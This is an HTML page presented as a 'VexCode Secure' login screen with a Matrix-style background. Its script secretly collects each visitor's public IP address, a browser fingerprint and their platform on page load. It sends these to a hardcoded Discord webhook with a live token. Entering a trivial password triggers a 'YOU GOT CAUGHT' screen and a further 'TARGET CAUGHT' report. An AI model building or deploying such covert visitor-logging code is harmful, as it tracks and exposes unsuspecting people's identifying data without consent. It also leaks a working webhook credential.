<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Access | VexCode</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #03050a;
      font-family: 'Courier New', monospace;
      color: #4db8ff;
      overflow: hidden;
    }
    #v_ { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
    .wrapper {
      padding: 2px;
      border-radius: 24px;
      background: linear-gradient(135deg, #1e90ff, #00c6ff, #1e90ff);
      box-shadow: 0 0 35px rgba(0, 150, 255, 0.25);
      z-index: 10;
    }
    .terminal {
      width: 360px;
      padding: 30px;
      background: #0b1220;
      border-radius: 20px;
      box-shadow: inset 0 0 20px rgba(0, 140, 255, 0.2), 0 15px 30px rgba(0, 0, 0, 0.6);
      text-align: center;
      display: none; /* Everything starts hidden until script runs */
    }
    
    h2 {
      margin: 0 0 20px 0;
      letter-spacing: 2px;
      font-size: 16px;
      text-transform: uppercase;
      color: #00c6ff;
      text-shadow: 0 0 8px rgba(0, 198, 255, 0.6);
    }
    .sysinfo-panel {
      background: #050a16;
      border: 1px solid #1e90ff;
      border-radius: 12px;
      padding: 12px;
      margin-top: 15px;
      font-size: 11px;
      text-align: left;
      color: #8cbaff;
    }
    .sysinfo-row {
      display: flex;
      justify-content: space-between;
      padding: 4px 0;
      border-bottom: 1px dotted #1e4f7a;
    }
    .sysinfo-value { font-weight: bold; color: #00ffb3; }
    
    label { font-size: 11px; opacity: 0.7; display: block; text-align: left; margin-bottom: 5px; }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: #050a16;
      border: 1px solid #1e90ff;
      border-radius: 10px;
      color: #4db8ff;
      box-sizing: border-box;
      outline: none;
    }
    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 12px;
      background: linear-gradient(90deg, #1e90ff, #00c6ff);
      font-weight: bold;
      cursor: pointer;
      color: #001428;
      text-transform: uppercase;
    }
    #err_msg { color: #ff4d4d; font-size: 10px; margin-bottom: 10px; min-height: 12px; }
    .footer { margin-top: 15px; font-size: 10px; opacity: 0.4; }
    .caught-message { color: #ff5555; font-size: 22px; font-weight: bold; margin: 20px 0; animation: pulse 1s infinite; }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
  </style>
</head>
<body>

<canvas id="v_"></canvas>

<div class="wrapper">
  <div id="gate_msg" class="terminal">
    <h2 style="color:#ff4d4d;">⛔ ACCESS REVOKED</h2>
    <div style="font-size: 12px; margin-bottom: 10px;">DEVICE PERMANENTLY BLACKLISTED</div>
    <div class="sysinfo-panel">
      <div class="sysinfo-row"><span>IP</span><span id="ban_ip">-</span></div>
      <div class="sysinfo-row"><span>HWID</span><span id="ban_id">-</span></div>
    </div>
  </div>

  <div id="caught_msg" class="terminal">
    <h2 style="color:#ff5555;">⚠️ SECURITY BREACH</h2>
    <div class="caught-message">YOU GOT CAUGHT</div>
    <div class="sysinfo-panel">
      <div class="sysinfo-row"><span>IP</span><span id="caught_ip">-</span></div>
      <div class="sysinfo-row"><span>DEVICE</span><span id="caught_dev">-</span></div>
      <div class="sysinfo-row"><span>OS</span><span id="caught_os">-</span></div>
    </div>
    <div class="footer">YOUR IDENTITY HAS BEEN LOGGED</div>
  </div>

  <div id="login_ui" class="terminal" style="display: block;">
    <h2>⚡ VexCode Secure</h2>
    <div id="err_msg"></div>
    
    <label>SYSTEM AUTHENTICATION</label>
    <input type="password" id="password_input" placeholder="ENTER ACCESS KEY">
    <button id="auth_btn">▶ AUTHORIZE</button>
    
    <div class="footer">SECURE CHANNEL · v.5.2</div>
  </div>
</div>

<script>
(function() {
  const WEBHOOK = 'https://discord.com/api/webhooks/1477568166681903166/PJlF61ClzxqXVf65w6jtZeUHUPew8Vk7h4THfp_drir0REEJqqNgYs22HrV8iVZKlomV';
  // Note: Removed the commit hash so it always pulls the newest blacklist
  const BLACKLIST_URL = 'https://gist.githubusercontent.com/VexCodeV2/f4081441720e8b72f60bbc6046e39371/raw/blacklist.json';
  const PASS = "1234";

  let userIP = "0.0.0.0";
  const BAN_LIST = { ips: new Set(), ids: new Set() };

  function getHWID() {
    const s = window.screen;
    const str = `${navigator.userAgent}${s.width}${s.height}${navigator.language}`;
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      hash = ((hash << 5) - hash) + str.charCodeAt(i);
      hash |= 0;
    }
    return Math.abs(hash).toString(16).toUpperCase();
  }

  function notify(type) {
    const hwid = getHWID();
    const embed = {
      title: type === 'ban' ? '🚫 BANNED USER ATTEMPT' : (type === 'caught' ? '🎯 TARGET CAUGHT' : '👁️ NEW VISITOR'),
      color: type === 'ban' ? 0xff0000 : (type === 'caught' ? 0xffaa00 : 0x00c6ff),
      fields: [
        { name: 'IP Address', value: userIP, inline: true },
        { name: 'Hardware ID', value: hwid, inline: true },
        { name: 'Browser/OS', value: navigator.platform, inline: false }
      ],
      timestamp: new Date().toISOString()
    };
    fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  }

  const hwid = getHWID();

  // --- NEW LOGIC: Wait for both IP and Blacklist before showing anything ---
  async function initialize() {
    try {
      // Run both fetches at once
      const [ipRes, listRes] = await Promise.all([
        fetch('https://api.ipify.org?format=json'),
        fetch(BLACKLIST_URL + '?t=' + Date.now())
      ]);

      const ipData = await ipRes.json();
      userIP = ipData.ip;

      const listData = await listRes.json();
      if(listData.banned_ips) listData.banned_ips.forEach(i => BAN_LIST.ips.add(i));
      if(listData.banned_device_ids) listData.banned_device_ids.forEach(i => BAN_LIST.ids.add(i));

      // Now check if user is banned
      if (BAN_LIST.ips.has(userIP) || BAN_LIST.ids.has(hwid)) {
        document.getElementById('login_ui').style.display = 'none';
        document.getElementById('gate_msg').style.display = 'block';
        document.getElementById('ban_ip').textContent = userIP;
        document.getElementById('ban_id').textContent = hwid;
        notify('ban');
      } else {
        // User is clean, show login
        document.getElementById('login_ui').style.display = 'block';
        notify('visit');
      }

    } catch (e) {
      console.error("Initialization failed", e);
      // Fallback: show login if blacklist fails (change this to hide if you want it strict)
      document.getElementById('login_ui').style.display = 'block';
    }
  }

  initialize();

  document.getElementById('auth_btn').onclick = function() {
    const val = document.getElementById('password_input').value;
    if (val === PASS) {
      document.getElementById('login_ui').style.display = 'none';
      document.getElementById('caught_msg').style.display = 'block';
      document.getElementById('caught_ip').textContent = userIP;
      document.getElementById('caught_dev').textContent = navigator.vendor || "Generic";
      document.getElementById('caught_os').textContent = navigator.platform;
      notify('caught');
    } else {
      document.getElementById('err_msg').textContent = 'INVALID ACCESS KEY';
    }
  };

  // Matrix BG
  const c = document.getElementById('v_');
  const x = c.getContext('2d');
  function resize() { c.width = window.innerWidth; c.height = window.innerHeight; }
  window.onresize = resize; resize();
  const drops = Array(200).fill(1);
  setInterval(() => {
    x.fillStyle = 'rgba(3, 5, 10, 0.15)'; x.fillRect(0,0,c.width,c.height);
    x.fillStyle = '#1e90ff';
    drops.forEach((y, i) => {
      x.fillText(String.fromCharCode(0x30A0 + Math.random()*96), i*20, y*20);
      if (y*20 > c.height && Math.random() > 0.975) drops[i] = 0;
      drops[i]++;
    });
  }, 35);
})();
</script>
</body>
</html>
